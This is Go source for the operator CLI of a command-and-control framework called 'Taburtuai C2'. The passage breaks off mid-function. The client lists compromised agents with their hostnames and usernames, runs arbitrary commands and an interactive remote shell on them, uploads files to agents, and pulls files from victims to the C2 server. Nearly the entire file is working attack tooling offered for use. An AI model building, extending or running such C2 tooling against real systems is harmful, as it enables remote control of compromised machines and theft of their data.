package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// Color codes for terminal output
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
)

// Global variables
var (
	config = &CLIConfig{
		ServerURL: os.Getenv("TABURTUAI_SERVER"),  // Default dari ENV
		APIKey:    os.Getenv("TABURTUAI_API_KEY"), // Default dari ENV
		Timeout:   30,                             // Default timeout
	}
	httpClient = &http.Client{Timeout: 60 * time.Second} // Timeout diperpanjang untuk operasi file
	verbose    bool
)

// CLIConfig holds configuration for the CLI
type CLIConfig struct {
	ServerURL string
	APIKey    string
	Timeout   int
}

// APIResponse represents standard API response
type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}

// Root command
var rootCmd = &cobra.Command{
	Use:   "taburtuai-cli",
	Short: "Taburtuai C2 Command Line Interface",
	Long: `Taburtuai C2 CLI - Enhanced Command & Control Interface
	
This CLI provides full control over the Taburtuai C2 server, allowing you to:
- Manage and monitor agents
- Execute commands remotely
- Transfer files
- View logs and statistics`,
	PersistentPreRun: func(cmd *cobra.Command, args []string) {
		// Ambil nilai dari flags jika diset, jika tidak, ENV atau default akan digunakan
		// Flags akan menimpa ENV jika keduanya diset.
		// Cobra menangani ini secara otomatis untuk PersistentFlags.
		if config.ServerURL == "" {
			// Jika setelah cobra parse flags masih kosong, berarti tidak diset via flag atau ENV
			// dan tidak ada default yang memuaskan di struct.
			// Namun, ServerURL memiliki default dari GetEnv di struct, jadi ini mungkin tidak akan terjadi
			// kecuali jika GetEnv mengembalikan string kosong dan flag tidak diset.
			// Kita tambahkan pemeriksaan eksplisit di sini untuk ServerURL.
			serverFlag, _ := cmd.Flags().GetString("server")
			if serverFlag != "" {
				config.ServerURL = serverFlag
			} else if os.Getenv("TABURTUAI_SERVER") != "" {
				config.ServerURL = os.Getenv("TABURTUAI_SERVER")
			} else {
				// Jika masih kosong, berikan default atau error
				// Default sudah diatur di cobra.Command.PersistentFlags() jika ada.
				// Kita pastikan ServerURL tidak kosong di sini.
				// Jika flag tidak ada defaultnya, kita set di sini.
				// Tapi karena kita sudah set default di PersistentFlags, ini lebih ke fallback.
				if config.ServerURL == "" { // Jika GetEnv return empty & flag tdk diset
					printError("TABURTUAI_SERVER environment variable or --server flag not set.")
					fmt.Println("Please set: export TABURTUAI_SERVER=http://your-server-url:port or use --server flag.")
					fmt.Println("Using default: http://localhost:8080")
					config.ServerURL = "http://localhost:8080" // Fallback jika semua gagal
				}
			}
		}
		// Perbarui timeout http client dari config.Timeout yang mungkin diubah oleh flag
		httpClient.Timeout = time.Duration(config.Timeout) * time.Second
	},
}

// --- SEMUA DEFINISI PERINTAH GLOBAL ADA DI SINI ---

// Agent commands
var agentsCmd = &cobra.Command{
	Use:   "agents",
	Short: "Manage agents",
	Long:  "List, view, and manage connected agents",
	// Tidak ada Run func, jadi akan tampil sebagai "topic" jika punya subcommands
}

var agentsListCmd = &cobra.Command{
	Use:   "list",
	Short: "List all agents",
	Run: func(cmd *cobra.Command, args []string) {
		printInfo("Fetching agent list...")

		body, err := makeAPIRequest("/api/v1/agents")
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch agents: %v", err))
			os.Exit(1)
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError("Failed to parse response")
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Server error: %s", response.Error))
			os.Exit(1)
		}

		data, ok := response.Data.(map[string]interface{})
		if !ok || data["agents"] == nil {
			printWarning("No agent data in response or invalid format.")
			return
		}

		agentsInterface, ok := data["agents"].([]interface{})
		if !ok {
			printWarning("Agent data is not in the expected list format.")
			return
		}

		if len(agentsInterface) == 0 {
			printWarning("No agents found")
			return
		}

		printSuccess(fmt.Sprintf("Found %d agent(s)", len(agentsInterface)))
		fmt.Println()

		fmt.Printf("%s%-36s %-20s %-15s %-10s %-20s%s\n",
			ColorBlue, "AGENT ID", "HOSTNAME", "USERNAME", "STATUS", "LAST SEEN", ColorReset)
		fmt.Println(strings.Repeat("-", 100))

		for _, agent := range agentsInterface {
			a, ok := agent.(map[string]interface{})
			if !ok {
				continue
			}

			agentID := getStringFromMap(a, "id")
			if len(agentID) > 35 { // Sesuaikan jika UUID penuh
				agentID = agentID[:8] + "..." // Ringkas jika terlalu panjang
			}

			hostname := getStringFromMap(a, "hostname")
			username := getStringFromMap(a, "username")
			status := getStringFromMap(a, "status")

			var statusColor string
			switch status {
			case "online":
				statusColor = ColorGreen
			case "offline":
				statusColor = ColorRed
			case "dormant":
				statusColor = ColorYellow
			default:
				statusColor = ColorWhite
			}

			lastSeen := "Unknown"
			if lastSeenStr := getStringFromMap(a, "last_seen"); lastSeenStr != "" {
				t, err := time.Parse(time.RFC3339, lastSeenStr)
				if err == nil {
					lastSeen = t.Format("2006-01-02 15:04:05")
				}
			}
			fmt.Printf("%-36s %-20s %-15s %s%-10s%s %-20s\n",
				agentID, hostname, username, statusColor, status, ColorReset, lastSeen)
		}
	},
}

var agentsInfoCmd = &cobra.Command{
	Use:   "info <agent-id>",
	Short: "Show detailed agent information",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printInfo(fmt.Sprintf("Fetching information for agent: %s", agentID))

		body, err := makeAPIRequest(fmt.Sprintf("/api/v1/agents/%s", agentID))
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch agent info: %v", err))
			os.Exit(1)
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse agent info response: %v", err))
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Error fetching agent info: %s", response.Error))
			os.Exit(1)
		}

		agent, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid agent data format received.")
			os.Exit(1)
		}

		fmt.Printf("\n%sAgent Information:%s\n", ColorBlue, ColorReset)
		fmt.Println(strings.Repeat("=", 50))

		fmt.Printf("%sID:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "id"))
		fmt.Printf("%sHostname:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "hostname"))
		fmt.Printf("%sUsername:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "username"))
		fmt.Printf("%sOS:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "os"))
		fmt.Printf("%sArchitecture:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "architecture"))
		fmt.Printf("%sStatus:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "status"))
		if lastSeenStr := getStringFromMap(agent, "last_seen"); lastSeenStr != "" {
			t, _ := time.Parse(time.RFC3339, lastSeenStr)
			fmt.Printf("%sLast Seen:%s %s\n", ColorCyan, ColorReset, t.Format("2006-01-02 15:04:05"))
		}
		if firstContactStr := getStringFromMap(agent, "first_contact"); firstContactStr != "" {
			t, _ := time.Parse(time.RFC3339, firstContactStr)
			fmt.Printf("%sFirst Contact:%s %s\n", ColorCyan, ColorReset, t.Format("2006-01-02 15:04:05"))
		}
		fmt.Printf("%sCommands Executed:%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(agent, "commands_executed"))
		// Tambahkan field lain jika ada dari AgentHealth
		fmt.Println(strings.Repeat("=", 50))
	},
}

// Command execution command
var cmdCmd = &cobra.Command{
	Use:   "cmd <agent-id> <command>",
	Short: "Execute command on agent",
	Long:  "Execute a command on the specified agent and wait for results by default.",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		commandStr := args[1]

		timeout, _ := cmd.Flags().GetInt("timeout")
		workDir, _ := cmd.Flags().GetString("workdir")
		background, _ := cmd.Flags().GetBool("background")

		printInfo(fmt.Sprintf("Executing command on agent %s", agentID))
		printVerbose(fmt.Sprintf("Command: %s, Timeout: %ds, WorkDir: %s, Background: %v", commandStr, timeout, workDir, background))

		reqBody := map[string]interface{}{
			"agent_id": agentID,
			"command":  commandStr, // Ini akan dieksekusi sebagai satu baris perintah oleh agent
			"timeout":  timeout,    // Server akan menggunakan default jika 0
		}
		if workDir != "" {
			reqBody["working_dir"] = workDir
		}
		// Untuk argumen terpisah, agent perlu parsing atau server perlu mengirim struktur berbeda.
		// Saat ini, agent mengharapkan `command` sebagai string tunggal.

		reqJSON, _ := json.Marshal(reqBody)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/command", bytes.NewBuffer(reqJSON), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send command to server: %v", err))
			os.Exit(1)
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse server response for cmd: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error queuing command: %s", apiResp.Error))
			os.Exit(1)
		}

		dataMap, ok := apiResp.Data.(map[string]interface{})
		if !ok || dataMap["command_id"] == nil {
			printError("Invalid command data format from server.")
			os.Exit(1)
		}
		commandID := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Command queued. Command ID: %s", commandID))

		if background {
			printInfo(fmt.Sprintf("Running in background. Check status with: taburtuai-cli status %s", commandID))
		} else {
			printInfo("Waiting for command execution to complete...")
			waitForCommand(commandID, timeout) // Gunakan timeout perintah sebagai batas tunggu
		}
	},
}

// Interactive shell command
var shellCmd = &cobra.Command{
	Use:   "shell <agent-id>",
	Short: "Start interactive shell session",
	Long:  "Start an interactive shell session with the specified agent.",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printInfo(fmt.Sprintf("Starting interactive shell with agent %s", agentID))
		printWarning("Type 'exit' or 'quit' or press Ctrl+D to quit.")
		fmt.Println()
		reader := bufio.NewReader(os.Stdin)

		for {
			fmt.Printf("%s[%s]$ %s", ColorGreen, agentID[:8], ColorReset)
			input, err := reader.ReadString('\n')
			if err != nil { // EOF (Ctrl+D) akan masuk sini
				fmt.Println("\nExiting shell session.")
				break
			}
			commandStr := strings.TrimSpace(input)
			if commandStr == "" {
				continue
			}
			if commandStr == "exit" || commandStr == "quit" {
				printInfo("Exiting shell session.")
				break
			}
			executeShellCommand(agentID, commandStr)
		}
	},
}

// Command status command
var statusCmd = &cobra.Command{
	Use:   "status <command-id>",
	Short: "Check command execution status",
	Long:  "Check the status of a previously executed command.",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		commandID := args[0]
		printInfo(fmt.Sprintf("Checking status for command: %s", commandID))

		body, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
		if err != nil {
			printError(fmt.Sprintf("Failed to get command status: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse status response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error getting command status: %s", response.Error))
			os.Exit(1)
		}
		if response.Data == nil {
			printError("No data found for this command status.")
			return
		}
		cmdData, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid command data format for status.")
			return
		}
		displayFinalCommandStatus(cmdData, commandID)
	},
}

// History command
var historyCmd = &cobra.Command{
	Use:   "history <agent-id>",
	Short: "Show agent command history",
	Long:  "Display the command execution history for the specified agent.",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		limit, _ := cmd.Flags().GetInt("limit")
		statusFilter, _ := cmd.Flags().GetString("status")

		printInfo(fmt.Sprintf("Fetching command history for agent: %s (limit %d)", agentID, limit))
		endpoint := fmt.Sprintf("/api/v1/agent/%s/commands?limit=%d", agentID, limit)
		if statusFilter != "" {
			endpoint += "&status=" + statusFilter
		}

		body, err := makeAPIRequest(endpoint)
		if err != nil {
			printError(fmt.Sprintf("Failed to get command history: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse history response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error getting history: %s", response.Error))
			os.Exit(1)
		}

		dataMap, ok := response.Data.(map[string]interface{})
		if !ok || dataMap["commands"] == nil {
			printWarning("No command history data in response or invalid format.")
			return
		}
		commandsInterface, ok := dataMap["commands"].([]interface{})
		if !ok {
			printWarning("Command history is not in the expected list format.")
			return
		}

		if len(commandsInterface) == 0 {
			printWarning("No command history found for this agent with current filters.")
			return
		}
		printSuccess(fmt.Sprintf("Found %d command(s) in history.", len(commandsInterface)))
		fmt.Println()
		fmt.Printf("%s%-12s %-20s %-10s %-8s %-30s%s\n",
			ColorBlue, "CMD ID", "TIMESTAMP", "STATUS", "EXIT", "COMMAND", ColorReset)
		fmt.Println(strings.Repeat("-", 90))

		for _, item := range commandsInterface {
			cmdMap, ok := item.(map[string]interface{})
			if !ok {
				continue
			}

			cmdID := getStringFromMap(cmdMap, "id")[:8] + "..."
			timestamp := "N/A"
			if tsStr := getStringFromMap(cmdMap, "executed_at"); tsStr != "" {
				t, _ := time.Parse(time.RFC3339, tsStr)
				timestamp = t.Format("01-02 15:04:05")
			} else if tsStr := getStringFromMap(cmdMap, "created_at"); tsStr != "" {
				t, _ := time.Parse(time.RFC3339, tsStr)
				timestamp = t.Format("01-02 15:04:05") + " (Q)"
			}
			status := getStringFromMap(cmdMap, "status")
			var statusColor string
			switch status {
			case "completed":
				statusColor = ColorGreen
			case "failed", "timeout":
				statusColor = ColorRed
			case "executing":
				statusColor = ColorBlue
			case "pending":
				statusColor = ColorYellow
			default:
				statusColor = ColorWhite
			}
			exitCode := "-"
			if ecVal, ecOK := cmdMap["exit_code"]; ecOK {
				exitCode = fmt.Sprintf("%.0f", ecVal.(float64))
			}
			commandStr := getStringFromMap(cmdMap, "command")
			if len(commandStr) > 28 {
				commandStr = commandStr[:25] + "..."
			}
			fmt.Printf("%-12s %-20s %s%-10s%s %-8s %-30s\n",
				cmdID, timestamp, statusColor, status, ColorReset, exitCode, commandStr)
		}
		fmt.Println()
		printInfo("Use 'taburtuai-cli status <command-id>' for detailed information.")
	},
}

// Queue management command
var queueCmd = &cobra.Command{
	Use:   "queue",
	Short: "Manage command queues",
	Long:  "View and manage command queues for agents.",
}

var queueStatsCmd = &cobra.Command{
	Use:   "stats",
	Short: "Show queue statistics",
	Run: func(cmd *cobra.Command, args []string) {
		printInfo("Fetching queue statistics...")
		body, err := makeAPIRequest("/api/v1/queue/stats")
		if err != nil {
			printError(fmt.Sprintf("Failed to get queue stats: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse queue stats response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error getting queue stats: %s", response.Error))
			os.Exit(1)
		}
		stats, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid queue stats data format.")
			os.Exit(1)
		}

		fmt.Printf("\n%sQueue Statistics:%s\n", ColorBlue, ColorReset)
		fmt.Println(strings.Repeat("=", 50))
		fmt.Printf("%sTotal Queued:%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(stats, "total_queued"))
		fmt.Printf("%sTotal Active:%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(stats, "total_active"))
		fmt.Printf("%sTotal Completed (in memory):%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(stats, "total_completed"))

		if byAgent, ok := stats["by_agent"].(map[string]interface{}); ok && len(byAgent) > 0 {
			fmt.Printf("\n%sBy Agent:%s\n", ColorBlue, ColorReset)
			fmt.Println(strings.Repeat("-", 50))
			for agentID, agentStatsIf := range byAgent {
				as, ok := agentStatsIf.(map[string]interface{})
				if !ok {
					continue
				}
				fmt.Printf("  %s%s%s:\n", ColorYellow, agentID[:8], ColorReset)
				fmt.Printf("    Queued: %.0f, Active: %.0f, Completed (this agent): %.0f\n",
					getFloatFromMap(as, "queued"),
					getFloatFromMap(as, "active"),
					getFloatFromMap(as, "completed_for_agent"))
			}
		}
		fmt.Println()
	},
}

var queueClearCmd = &cobra.Command{
	Use:   "clear <agent-id>",
	Short: "Clear pending commands for an agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printWarning(fmt.Sprintf("Attempting to clear command queue for agent %s...", agentID))
		serverRespBytes, err := makeAPIRequestWithMethod("DELETE", "/api/v1/agent/"+agentID+"/queue", nil, "")
		if err != nil {
			printError(fmt.Sprintf("Failed to send clear queue request: %v", err))
			os.Exit(1)
		}
		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse clear queue response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}
		if apiResp.Success {
			printSuccess(apiResp.Message)
		} else {
			printError(fmt.Sprintf("Error clearing queue: %s", apiResp.Error))
		}
	},
}

// Files command
var filesCmd = &cobra.Command{
	Use:   "files",
	Short: "File operations",
	Long:  "Upload, download, and manage files between CLI, C2 Server, and Agents.",
}

var filesUploadCmd = &cobra.Command{
	Use:   "upload <agent-id> <local-file> <remote-path>",
	Short: "Upload file from CLI to agent via C2 server",
	Long: `Uploads a local file to the specified agent at the given remote path.
The file is first sent to the C2 server, which then tasks the agent to store it.`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		localFilePath := args[1]
		remotePathOnAgent := args[2]
		wait, _ := cmd.Flags().GetBool("wait")

		printInfo(fmt.Sprintf("Preparing to upload '%s' to agent '%s' at '%s'", localFilePath, agentID, remotePathOnAgent))

		localFile, err := os.Open(localFilePath)
		if err != nil {
			printError(fmt.Sprintf("Failed to open local file '%s': %v", localFilePath, err))
			os.Exit(1)
		}
		defer localFile.Close()

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		_ = writer.WriteField("destination_path", remotePathOnAgent)
		part, _ := writer.CreateFormFile("file", filepath.Base(localFilePath))
		_, _ = io.Copy(part, localFile)
		writer.Close()

		serverURL := fmt.Sprintf("%s/api/v1/agent/%s/upload", config.ServerURL, agentID)
		req, _ := http.NewRequest("POST", serverURL, body)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		if config.APIKey != "" {
			req.Header.Set("Authorization", "Bearer "+config.APIKey)
		}

		printInfo(fmt.Sprintf("Uploading '%s' to C2 server for agent '%s'...", filepath.Base(localFilePath), agentID))
		resp, err := httpClient.Do(req)
		if err != nil {
			printError(fmt.Sprintf("Failed to send upload request to C2 server: %v", err))
			os.Exit(1)
		}
		defer resp.Body.Close()

		respBody, _ := io.ReadAll(resp.Body)
		var apiResp APIResponse
		_ = json.Unmarshal(respBody, &apiResp)

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error during upload tasking: %s", apiResp.Error))
			os.Exit(1)
		}
		dataMap, ok := apiResp.Data.(map[string]interface{})
		if !ok || dataMap["command_id"] == nil {
			printError("Invalid command data from server for upload.")
			os.Exit(1)
		}
		commandID := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Upload command queued. Command ID: %s", commandID))

		if wait {
			printInfo("Waiting for upload to complete on agent...")
			waitForCommand(commandID, 300) // Timeout 5 menit
		} else {
			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
		}
	},
}

var filesDownloadCmd = &cobra.Command{
	Use:   "download <agent-id> <remote-file> <local-path>",
	Short: "Download file from agent to C2 server, save at specified server path",
	Long: `Tasks the agent to send a file to the C2 server. 
The C2 server will attempt to save this file to the 'local-path' provided (which is a path on the C2 server itself).
To get the file to your CLI machine, further steps might be needed if CLI and Server are separate.`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		remoteFileOnAgent := args[1]
		pathOnServerToSave := args[2]
		wait, _ := cmd.Flags().GetBool("wait")

		printInfo(fmt.Sprintf("Requesting download of '%s' from agent '%s'. Server will attempt to save to '%s'", remoteFileOnAgent, agentID, pathOnServerToSave))

		reqPayload := map[string]string{
			"source_path":      remoteFileOnAgent,
			"destination_path": pathOnServerToSave,
		}
		jsonPayload, err := json.Marshal(reqPayload)
		if err != nil {
			printError(fmt.Sprintf("Failed to marshal download request payload: %v", err))
			os.Exit(1)
		}

		// Variabel serverURL lokal DIHAPUS karena tidak digunakan.
		// endpoint yang benar akan digabungkan dengan config.ServerURL di dalam makeAPIRequestWithMethod
		endpoint := fmt.Sprintf("/api/v1/agent/%s/download", agentID)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send download request to C2 server: %v", err))
			os.Exit(1)
		}

		var apiResp APIResponse
		if errUnmarshal := json.Unmarshal(serverRespBytes, &apiResp); errUnmarshal != nil {
			printError(fmt.Sprintf("Failed to parse server response for download task (CommandID may be missing): %v. Raw: %s", errUnmarshal, string(serverRespBytes)))
			// Tetap lanjutkan untuk mencoba mendapatkan CommandID jika formatnya sedikit berbeda tapi masih ada
		}

		if !apiResp.Success { // Periksa setelah potensi unmarshal error
			printError(fmt.Sprintf("Server error during download tasking: %s", apiResp.Error))
			// Jika ada error dari server, mungkin tidak ada command_id
			// Jadi kita keluar di sini jika server mengindikasikan kegagalan awal
			if apiResp.Data == nil {
				os.Exit(1)
			}
			// Coba periksa apakah ada command_id meskipun gagal, untuk status checking
			if dataMap, ok := apiResp.Data.(map[string]interface{}); ok {
				if cmdID, idOK := dataMap["command_id"].(string); idOK && cmdID != "" {
					printWarning(fmt.Sprintf("Server reported error, but command ID %s was issued. You can try to check its status.", cmdID))
				}
			}
			os.Exit(1)
		}

		dataMap, ok := apiResp.Data.(map[string]interface{})
		if !ok || dataMap["command_id"] == nil {
			printError("Invalid or missing command data from server for download task.")
			os.Exit(1)
		}
		commandID := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Download command queued. Command ID: %s", commandID))
		printInfo(fmt.Sprintf("The file will be sent from agent to C2 server and saved at/near '%s' on the server.", pathOnServerToSave))

		if wait {
			printInfo("Waiting for download to complete and be processed by server...")
			finalStatusData := waitForCommand(commandID, 600) // Timeout 10 menit
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					if serverMsg, ok := statusMap["output"].(string); ok && strings.Contains(serverMsg, "File successfully downloaded from agent and saved to server") {
						printSuccess(serverMsg)
						printInfo("File is now on the C2 server. If CLI is on a different machine, retrieve it from the server manually or via a future 'get-staged-file' command.")
					} else if errMsg, ok := statusMap["error"].(string); ok && errMsg != "" {
						printError(fmt.Sprintf("Download operation reported an error: %s", errMsg))
					} else if statusMap["status"] == "completed" { // Jika completed tapi tidak ada pesan output spesifik
						printSuccess(fmt.Sprintf("Download command %s completed. Check server path '%s'.", commandID, pathOnServerToSave))
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
		}
	},
}

// Logs command
var logsCmd = &cobra.Command{
	Use:   "logs",
	Short: "Show server logs",
	Run: func(cmd *cobra.Command, args []string) {
		limit, _ := cmd.Flags().GetInt("limit")
		printInfo(fmt.Sprintf("Fetching last %d log entries...", limit))
		body, err := makeAPIRequest(fmt.Sprintf("/api/v1/logs?count=%d", limit)) // server uses 'count'
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch logs: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse logs response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error fetching logs: %s", response.Error))
			os.Exit(1)
		}
		logsInterface, ok := response.Data.([]interface{})
		if !ok {
			printWarning("Log data is not in the expected list format.")
			return
		}
		if len(logsInterface) == 0 {
			printWarning("No logs found.")
			return
		}
		printSuccess(fmt.Sprintf("Showing %d log entries:", len(logsInterface)))
		fmt.Println()
		for _, logEntry := range logsInterface {
			entry, ok := logEntry.(map[string]interface{})
			if !ok {
				continue
			}
			timestamp := getStringFromMap(entry, "timestamp")
			level := getStringFromMap(entry, "level")
			category := getStringFromMap(entry, "category")
			message := getStringFromMap(entry, "message")
			agentID := getStringFromMap(entry, "agent_id")
			var levelColor string
			switch level {
			case "INFO":
				levelColor = ColorBlue
			case "WARN":
				levelColor = ColorYellow
			case "ERROR", "CRITICAL":
				levelColor = ColorRed
			default:
				levelColor = ColorWhite
			}
			logLine := fmt.Sprintf("%s[%s]%s [%s] [%s] %s",
				levelColor, level, ColorReset, timestamp, category, message)
			if agentID != "" {
				logLine += fmt.Sprintf(" (Agent: %s)", agentID[:min(len(agentID), 8)])
			}
			fmt.Println(logLine)
		}
	},
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Stats command
var statsCmd = &cobra.Command{
	Use:   "stats",
	Short: "Show server statistics",
	Run: func(cmd *cobra.Command, args []string) {
		printInfo("Fetching server statistics...")
		body, err := makeAPIRequest("/api/v1/stats")
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch stats: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse stats response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error fetching stats: %s", response.Error))
			os.Exit(1)
		}
		stats, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid stats data format.")
			os.Exit(1)
		}
		fmt.Printf("\n%sServer Statistics:%s\n", ColorBlue, ColorReset)
		fmt.Println(strings.Repeat("=", 50))
		if agentStats, ok := stats["agents"].(map[string]interface{}); ok {
			fmt.Printf("%sAgent Statistics:%s\n", ColorCyan, ColorReset)
			fmt.Printf("  Total Agents: %.0f\n", getFloatFromMap(agentStats, "total_agents"))
			fmt.Printf("  Online: %s%.0f%s\n", ColorGreen, getFloatFromMap(agentStats, "online_agents"), ColorReset)
			fmt.Printf("  Offline: %s%.0f%s\n", ColorRed, getFloatFromMap(agentStats, "offline_agents"), ColorReset)
			fmt.Printf("  Total Commands Executed (by agents): %.0f\n", getFloatFromMap(agentStats, "total_commands"))
		}
		if serverInfo, ok := stats["server"].(map[string]interface{}); ok {
			fmt.Printf("\n%sServer Information:%s\n", ColorCyan, ColorReset)
			fmt.Printf("  Version: %s\n", getStringFromMap(serverInfo, "version"))
			fmt.Printf("  Uptime: %s\n", getStringFromMap(serverInfo, "uptime"))
		}
		if logStats, ok := stats["logs"].(map[string]interface{}); ok {
			fmt.Printf("\n%sLogging Statistics:%s\n", ColorCyan, ColorReset)
			fmt.Printf("  Total Log Entries (in memory): %.0f\n", getFloatFromMap(logStats, "total_entries"))
		}
		fmt.Println()
	},
}

// Version command
var versionCmd = &cobra.Command{
	Use:   "version",
	Short: "Show CLI version",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("%sTaburtuai CLI%s\n", ColorGreen, ColorReset)
		fmt.Println("Version: 2.0 - Phase 2 (with File Ops)") // Perbarui versi jika perlu
		fmt.Printf("Target Server: %s\n", config.ServerURL)
		apiKeyStatus := "Not Configured"
		if config.APIKey != "" {
			apiKeyStatus = "Configured (hidden)"
		}
		fmt.Printf("API Key: %s\n", apiKeyStatus)
	},
}

var processCmd = &cobra.Command{
	Use:     "process",
	Short:   "Manage processes on an agent",
	Aliases: []string{"proc"},
}

var processListCmd = &cobra.Command{
	Use:   "list <agent-id>",
	Short: "List processes on an agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printInfo(fmt.Sprintf("Requesting process list from agent %s...", agentID))
		// Buat JSON payload (kosong untuk list)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/list", nil, "application/json")
		// ... (handle response, queue command, waitForCommand, tampilkan hasil) ...
		// Hasil dari agent (result.Output) akan berisi string (mungkin JSON string dari PowerShell, atau teks dari ps)
		// CLI perlu menampilkannya, atau jika JSON, bisa di-parse dan ditampilkan lebih rapi.
		// (Implementasi lengkap Run function akan serupa dengan cmdCmd)
		if err != nil {
			printError(fmt.Sprintf("Failed to send process list request: %v", err))
			os.Exit(1)
		}
		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil { /* ... error handling ... */
			return
		}
		if !apiResp.Success {
			printError("Server error: " + apiResp.Error)
			os.Exit(1)
		}

		dataMap, _ := apiResp.Data.(map[string]interface{})
		commandID, _ := dataMap["command_id"].(string)
		printSuccess("Process list command queued. ID: " + commandID)

		wait, _ := cmd.Flags().GetBool("wait")
		if wait {
			finalStatusData := waitForCommand(commandID, 60) // Tunggu 60 detik
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					output, _ := statusMap["output"].(string)
					if output != "" {
						printInfo("Process List Output from Agent:")
						// Coba parse sebagai JSON jika dari powershell
						var processesInfo []map[string]interface{}
						if errJson := json.Unmarshal([]byte(output), &processesInfo); errJson == nil {
							// Tampilkan dalam format tabel yang lebih bagus jika berhasil diparse
